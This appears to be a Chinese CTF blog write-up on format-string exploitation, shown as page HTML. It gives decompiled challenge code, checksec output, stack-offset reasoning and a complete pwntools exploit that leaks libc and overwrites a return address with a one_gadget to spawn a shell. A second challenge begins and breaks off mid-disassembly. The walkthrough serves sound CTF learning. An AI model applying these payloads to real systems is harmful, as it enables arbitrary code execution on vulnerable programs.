@@ -1,0 +1,625 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 7.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+  <link rel="stylesheet" href="/lib/pace/pace-theme-minimal.min.css">
+  <script src="/lib/pace/pace.min.js"></script>
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"linkpwn.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":true,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="进行格式化字符串专题的加强，先写一个题目，再重温一下知识点进行总结一下。 TGCTF fmt1234567891011121314151617181920int __fastcall main(int argc, const char **argv, const char **envp)&#123;  char buf[88]; &#x2F;&#x2F; [rsp+0h] [rbp-60h] BYREF  unsig">
+<meta property="og:type" content="article">
+<meta property="og:title" content="格式化字符串专题加强">
+<meta property="og:url" content="http://linkpwn.github.io/2025/07/08/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B8%93%E9%A2%98%E5%8A%A0%E5%BC%BA/index.html">
+<meta property="og:site_name" content="网络幻影">
+<meta property="og:description" content="进行格式化字符串专题的加强，先写一个题目，再重温一下知识点进行总结一下。 TGCTF fmt1234567891011121314151617181920int __fastcall main(int argc, const char **argv, const char **envp)&#123;  char buf[88]; &#x2F;&#x2F; [rsp+0h] [rbp-60h] BYREF  unsig">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://linkpwn.github.io/2025/07/08/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B8%93%E9%A2%98%E5%8A%A0%E5%BC%BA/%E4%BE%8B%E5%AD%901.1.png">
+<meta property="og:image" content="http://linkpwn.github.io/2025/07/08/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B8%93%E9%A2%98%E5%8A%A0%E5%BC%BA/%E4%BE%8B%E5%AD%901.0.png">
+<meta property="article:published_time" content="2025-07-08T07:13:34.000Z">
+<meta property="article:modified_time" content="2025-09-23T13:29:06.578Z">
+<meta property="article:author" content="linkpwn">
+<meta property="article:tag" content="ctf学习，编程学习，游戏，日常">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://linkpwn.github.io/2025/07/08/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B8%93%E9%A2%98%E5%8A%A0%E5%BC%BA/%E4%BE%8B%E5%AD%901.1.png">
+
+<link rel="canonical" href="http://linkpwn.github.io/2025/07/08/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B8%93%E9%A2%98%E5%8A%A0%E5%BC%BA/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>格式化字符串专题加强 | 网络幻影</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta custom-logo">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">网络幻影</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">linkpwn太卷了?</p>
+      <a>
+        <img class="custom-logo-image" src="/uploads/custom-logo.jpg" alt="网络幻影">
+      </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-fw fa-th"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-links">
+
+    <a href="/links/" rel="section"><i class="fa fa-fw fa-link"></i>友链</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://linkpwn.github.io/2025/07/08/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B8%93%E9%A2%98%E5%8A%A0%E5%BC%BA/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="linkpwn">
+      <meta itemprop="description" content="linkpwn的学习经历">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="网络幻影">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          格式化字符串专题加强
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2025-07-08 15:13:34" itemprop="dateCreated datePublished" datetime="2025-07-08T15:13:34+08:00">2025-07-08</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2025-09-23 21:29:06" itemprop="dateModified" datetime="2025-09-23T21:29:06+08:00">2025-09-23</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/PWN/" itemprop="url" rel="index"><span itemprop="name">PWN</span></a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/PWN/%E6%80%BB%E7%BB%93/" itemprop="url" rel="index"><span itemprop="name">总结</span></a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/PWN/%E6%80%BB%E7%BB%93/stack/" itemprop="url" rel="index"><span itemprop="name">stack</span></a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/PWN/%E6%80%BB%E7%BB%93/stack/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/" itemprop="url" rel="index"><span itemprop="name">格式化字符串</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>进行格式化字符串专题的加强，先写一个题目，再重温一下知识点进行总结一下。</p>
+<h3 id="TGCTF-fmt"><a href="#TGCTF-fmt" class="headerlink" title="TGCTF fmt"></a>TGCTF fmt</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">88</span>]; <span class="comment">// [rsp+0h] [rbp-60h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v5; <span class="comment">// [rsp+58h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stderr</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Welcome TGCTF!&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;your gift %p\n&quot;</span>, buf);   <span class="comment">//泄露出</span></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;please tell me your name&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x30u</span>LL);    <span class="comment">//没有栈溢出</span></span><br><span class="line">  <span class="keyword">if</span> ( magic == <span class="number">1131796</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(buf);   <span class="comment">//存在格式化字符串漏洞</span></span><br><span class="line">    magic = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>只有一个格式化字符串漏洞，也只有一个读入。先去查看一下保护</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">(myenv) linkpwn@linkpwn-VMware-Virtual-Platform:~$ checksec pwn</span><br><span class="line">[*] &#x27;/home/linkpwn/pwn&#x27;</span><br><span class="line">    Arch:       amd64-64-little</span><br><span class="line">    RELRO:      Full RELRO</span><br><span class="line">    Stack:      Canary found</span><br><span class="line">    NX:         NX enabled</span><br><span class="line">    PIE:        No PIE (0x400000)</span><br><span class="line">    SHSTK:      Enabled</span><br><span class="line">    IBT:        Enabled</span><br><span class="line">    Stripped:   No</span><br></pre></td></tr></table></figure>
+
+<p>没有开启pie，canary开启了，但是我们没用到栈溢出，所以我们不用管canary</p>
+<p>因此这个题目的攻击思路就是，先利用格式化字符串泄露libc的基地址，然后再利用one_gadget.。</p>
+<p>首先我们利用格式化字符串泄露libc的地址，同时也要利用格式化字符串写入one_gadget。</p>
+<p>要利用两次格式化字符串的话，我们就不能让函数执行到    magic &#x3D; 0;，所以我们必须把printf_ret的地址覆盖为read的地址，方便下次</p>
+<p>的读入。</p>
+<p>泄露出libc_start_main+xxx的地址可以计算出libc的基地址。</p>
+<p>再用one_get工具查出execve(&#x2F;bin&#x2F;sh)的偏移，在用格式化字符串漏洞将返回地址写成execve(&#x2F;bin&#x2F;sh)的地址就可以getshell了</p>
+<p>现在开始正式开始攻击</p>
+<p>exp</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># ================ 配置与初始化 ================</span></span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">io = process(<span class="string">&#x27;./pwn&#x27;</span>)              <span class="comment"># 本地调试</span></span><br><span class="line"><span class="comment">#io = remote(&#x27;ip&#x27;, port)  # 远程连接</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ================ 泄露栈地址 ================</span></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">stack_addr = <span class="built_in">int</span>(io.recv(<span class="number">12</span>), <span class="number">16</span>)</span><br><span class="line">info(<span class="string">f&quot;Stack address: <span class="subst">&#123;<span class="built_in">hex</span>(stack_addr)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ================ 第一次格式化字符串攻击：泄露 libc 地址 ================</span></span><br><span class="line">payload = <span class="string">b&quot;%4669c%11$hn&quot;</span>           <span class="comment"># 控制写入低 2 字节</span></span><br><span class="line">payload += <span class="string">b&quot;%19$p&quot;</span>                 <span class="comment"># 泄露 __libc_start_main 地址</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x28</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += p64(stack_addr - <span class="number">8</span>)      <span class="comment"># 写入到 stack_addr - 8 的位置</span></span><br><span class="line"></span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 接收泄露的 libc 地址</span></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">leaked_libc = <span class="built_in">int</span>(io.recv(<span class="number">12</span>), <span class="number">16</span>)</span><br><span class="line">libc_base = leaked_libc - <span class="number">122</span> - libc.sym[<span class="string">&#x27;__libc_start_main&#x27;</span>]</span><br><span class="line">libc.address = libc_base</span><br><span class="line">info(<span class="string">f&quot;Libc base: <span class="subst">&#123;<span class="built_in">hex</span>(libc_base)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ================ 准备 one_gadget 并进行第二次格式化字符串写入 ================</span></span><br><span class="line">one_gadgets = [<span class="number">0xE3AFE</span>, <span class="number">0xE3B01</span>, <span class="number">0xE3B04</span>]</span><br><span class="line">one_gadget = libc.address + one_gadgets[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 构造格式化字符串写入 gadget 地址（分两次写入两个 16 位）</span></span><br><span class="line">low = one_gadget &amp; <span class="number">0xFFFF</span></span><br><span class="line">high = (one_gadget &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xFFFF</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">f&quot;%<span class="subst">&#123;low&#125;</span>c%10$hn&quot;</span>.encode()</span><br><span class="line">payload += <span class="string">f&quot;%<span class="subst">&#123;(high - low) &amp; <span class="number">0xFFFF</span>&#125;</span>c%11$hn&quot;</span>.encode()</span><br><span class="line">payload = payload.ljust(<span class="number">0x20</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 栈上写入两个地址：分别写入 gadget 地址的低位和高位</span></span><br><span class="line">payload += p64(stack_addr + <span class="number">0x68</span>)        <span class="comment"># 返回地址所在栈偏移</span></span><br><span class="line">payload += p64(stack_addr + <span class="number">0x68</span> + <span class="number">2</span>)    <span class="comment"># +2 写入高位部分</span></span><br><span class="line"></span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ================ 获取 Flag ================</span></span><br><span class="line">io.sendline(<span class="string">b&#x27;cat f*&#x27;</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">b&quot;%4669c%11$hn&quot;</span>          <span class="comment">#hex(4669) = 0x123d --&gt;read地址的后两字节</span></span><br><span class="line">payload += <span class="string">b&quot;%19$p&quot;</span>                <span class="comment">#泄露libc_start_main+地址</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x28</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += p64(stack_addr - <span class="number">8</span>)      <span class="comment">#p64(stack_addr - 8)----&gt;printf的返回地址</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2025/07/08/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B8%93%E9%A2%98%E5%8A%A0%E5%BC%BA/%E4%BE%8B%E5%AD%901.1.png" alt="1"></p>
+<p><img src="/2025/07/08/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B8%93%E9%A2%98%E5%8A%A0%E5%BC%BA/%E4%BE%8B%E5%AD%901.0.png" alt="1"></p>
+<p>可以看到0x7fffffffdd08 &#x3D; 0x7fffffffdd10 - 0x08从而定位printf_ret的地址。</p>
+<p>然后我们可以看到libc_start_main+122的地址在栈上的位置；</p>
+<p>0x7fffffffdd78 - 0x7fffffffdd10 &#x3D; 104，104&#x2F;8  &#x3D; 13，此时我们用%19$p就可以泄露出libc_start_main+122的地址，再减去122就可以得到</p>
+<p>libc_start_main地址，再用libc_start_main减去偏移就可以得到基地地址了。</p>
+<p>然后再%4669c%11$hn进行两字节的写入。将printf_ret的地址改成read的地址。</p>
+<p>用one_gdaget命令查execve(&#x2F;bin&#x2F;sh)的偏移</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">linkpwn@linkpwn-VMware-Virtual-Platform:~$ one_gadget libc.so.6</span><br><span class="line">0xe3afe execve(&quot;/bin/sh&quot;, r15, r12)</span><br><span class="line">constraints:</span><br><span class="line">  [r15] == NULL || r15 == NULL || r15 is a valid argv</span><br><span class="line">  [r12] == NULL || r12 == NULL || r12 is a valid envp</span><br><span class="line"></span><br><span class="line">0xe3b01 execve(&quot;/bin/sh&quot;, r15, rdx)</span><br><span class="line">constraints:</span><br><span class="line">  [r15] == NULL || r15 == NULL || r15 is a valid argv</span><br><span class="line">  [rdx] == NULL || rdx == NULL || rdx is a valid envp</span><br><span class="line"></span><br><span class="line">0xe3b04 execve(&quot;/bin/sh&quot;, rsi, rdx)</span><br><span class="line">constraints:</span><br><span class="line">  [rsi] == NULL || rsi == NULL || rsi is a valid argv</span><br><span class="line">  [rdx] == NULL || rdx == NULL || rdx is a valid envp</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">one_gadgets = [<span class="number">0xE3AFE</span>, <span class="number">0xE3B01</span>, <span class="number">0xE3B04</span>]</span><br><span class="line">one_gadget = libc.address + one_gadgets[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 构造格式化字符串写入 gadget 地址（分两次写入两个 16 位）</span></span><br><span class="line">low = one_gadget &amp; <span class="number">0xFFFF</span>   <span class="comment">#低16位的两个字节</span></span><br><span class="line">high = (one_gadget &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xFFFF</span>  <span class="comment">#高16位的两个字节</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">f&quot;%<span class="subst">&#123;low&#125;</span>c%10$hn&quot;</span>.encode()  <span class="comment">#把低16位的两个字节写入偏移为10的位置</span></span><br><span class="line">payload += <span class="string">f&quot;%<span class="subst">&#123;(high - low) &amp; <span class="number">0xFFFF</span>&#125;</span>c%11$hn&quot;</span>.encode()  <span class="comment">#把高16位的两个字节写入偏移为11的位置</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x20</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 栈上写入两个地址：分别写入 gadget 地址的低位和高位</span></span><br><span class="line">payload += p64(stack_addr + <span class="number">0x68</span>)        <span class="comment"># 返回地址所在栈偏移  偏移为10的位置</span></span><br><span class="line">payload += p64(stack_addr + <span class="number">0x68</span> + <span class="number">2</span>)    <span class="comment"># +2 写入高位部分 偏移为11的位置</span></span><br></pre></td></tr></table></figure>
+
+<p>注释：11是怎么算出来的</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">linkpwn@linkpwn-VMware-Virtual-Platform:~$ ./pwn</span><br><span class="line">Welcome TGCTF!</span><br><span class="line">your gift 0x7ffeec1ae9c0</span><br><span class="line">please tell me your name</span><br><span class="line">aaaa %p %p %p %p %p %p %p %p %p</span><br><span class="line">aaaa 0x7ffeec1ae9c0 0x30 0x7c484851ba61 0x18 (nil) 0x2070252061616161 0x7025207025207025 0x2520702520702520 0xa70252070252070</span><br></pre></td></tr></table></figure>
+
+<p>偏移是6,0x28&#x2F;8 &#x3D; 5，5 + 6 &#x3D;11；</p>
+<h3 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h3><p>写完这题就来总结一下格式化字符串的原理。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">264</span>]; <span class="comment">// [rsp+0h] [rbp-110h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v5; <span class="comment">// [rsp+108h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  ((<span class="type">void</span> (__fastcall *)(<span class="type">int</span>, <span class="type">const</span> <span class="type">char</span> **, <span class="type">const</span> <span class="type">char</span> **))init)(argc, argv, envp);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;-----&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x110u</span>LL);</span><br><span class="line">  <span class="built_in">printf</span>(buf);   <span class="comment">//只有唯一的一个格式化字符串的漏洞，所以我们要构造一个循环</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">.text:000000000040121B ; __unwind &#123;</span><br><span class="line">.text:000000000040121B                 endbr64</span><br><span class="line">.text:000000000040121F                 push    rbp</span><br><span class="line">.text:0000000000401220                 mov     rbp, rsp</span><br><span class="line">.text:0000000000401223                 sub     rsp, 110h</span><br><span class="line">.text:000000000040122A                 mov     rax, fs:28h</span><br><span class="line">.text:0000000000401233                 mov     [rbp+var_8], rax</span><br><span class="line">.text:0000000000401237                 xor     eax, eax</span><br><span class="line">.text:0000000000401239                 mov     eax, 0</span><br><span class="line">.text:000000000040123E                 call    init</span><br><span class="line">.text:0000000000401243                 lea     rax, s          ; &quot;-----&quot;</span><br><span class="line">.text:000000000040124A                 mov     rdi, rax        ; s</span><br><span class="line">.text:000000000040124D                 call    _puts</span><br><span class="line">.text:0000000000401252                 lea     rax, [rbp+buf]</span><br><span class="line">.text:0000000000401259                 mov     edx, 110h       ; nbytes</span><br><span class="line">.text:000000000040125E                 mov     rsi, rax        ; buf</span><br><span class="line">.text:0000000000401261                 mov     edi, 0          ; fd</span><br><span class="line">.text:0000000000401266                 call    _read</span><br><span class="line">.text:000000000040126B                 lea     rax, [rbp+buf]</span><br><span class="line">.text:0000000000401272                 mov     rdi, rax        ; format</span><br><span class="line">.text:0000000000401275                 mov     eax, 0</span><br><span class="line">.text:000000000040127A                 call    _printf</span><br><span class="line">.text:000000000040127F                 mov     eax, 0</span><br><span class="line">.text:0000000000401284                 mov     rdx, [rbp+var_8]</span><br><span class="line">.text:0000000000401288                 sub     rdx, 